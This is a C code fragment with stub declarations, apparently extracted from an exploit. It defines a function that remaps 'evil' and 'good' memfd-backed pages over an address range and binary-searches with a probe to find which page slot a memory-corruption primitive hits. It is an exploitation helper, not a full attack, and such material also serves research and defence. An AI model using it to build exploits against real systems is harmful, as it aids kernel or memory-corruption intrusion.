
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int EXIT_FAILURE ;
 int assert (int) ;
 int bisect_probe () ;
 int close (int) ;
 int create_filled_memfd (char*,unsigned long,unsigned long) ;
 scalar_t__ evil ;
 int exit (int ) ;
 scalar_t__ good ;
 int munmap (void*,unsigned long) ;
 int perror (char*) ;
 int remap_fd_over (int,unsigned long,unsigned long,unsigned long) ;

__attribute__((used)) static unsigned long bisect_via_memfd(unsigned long fd_size,
    unsigned long start, unsigned long end) {
 assert((end - start) % fd_size == 0);

 int fd_evil = create_filled_memfd("evil", fd_size, (unsigned long)evil);
 int fd_good = create_filled_memfd("good", fd_size, (unsigned long)good);

 unsigned long left = 0;
 unsigned long right = (end - start) / fd_size;

 while (right - left > 1) {
  unsigned long middle = left + (right - left) / 2;
  remap_fd_over(fd_evil, fd_size, start + left * fd_size,
    start + middle * fd_size);
  remap_fd_over(fd_good, fd_size, start + middle * fd_size,
    start + right * fd_size);
  bool probe = bisect_probe();
  if (probe)
   left = middle;
  else
   right = middle;
 }

 int rv = munmap((void *)start, end - start);
 if (rv != 0) {
  perror("[-] munmap()");
  exit(EXIT_FAILURE);
 }

 close(fd_evil);
 close(fd_good);

 return start + left * fd_size;
}
